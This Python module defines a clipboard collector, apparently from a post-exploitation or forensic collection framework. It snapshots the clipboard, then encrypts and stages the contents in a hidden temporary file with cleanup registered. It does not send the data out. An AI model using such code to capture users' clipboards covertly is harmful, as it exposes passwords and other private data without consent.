
from __future__ import annotations

import logging
import os
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)

class ClipboardCollector(BaseCollector):
    """
    Single clipboard snapshot. No polling. Cross-platform via pyperclip.
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        try:
            import pyperclip
            content = pyperclip.paste()
        except ImportError:
            _LOG.debug("pyperclip not installed — ClipboardCollector disabled.")
            return
        except Exception as exc:
            _LOG.debug("Clipboard read error: %s", exc)
            return

        if not content:
            return

        yield ArtifactMetadata(
            artifact_family="clipboard",
            source_path="clipboard",
            source_platform=os.name,
            collection_method="api_call",
        )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        try:
            import pyperclip
            content = pyperclip.paste()
        except ImportError:
            return None
        except Exception as exc:
            _LOG.debug("Clipboard read error: %s", exc)
            return None

        if not content:
            return None

        data    = content.encode("utf-8", errors="replace")
        sha256  = self._sha256(data)
        payload = self._compress_and_encrypt(data)
        del data
        del content

        stage_path = self._staging_dir / f".{sha256[:16]}.clip.tmp"
        stage_path.write_bytes(payload)
        self._register_cleanup(stage_path)

        record = CollectedFile(
            path       = "CLIPBOARD",
            sha256     = sha256,
            size_bytes = len(payload),
            metadata   = artifact,
        )
        self.persist_metadata(record)
        return record
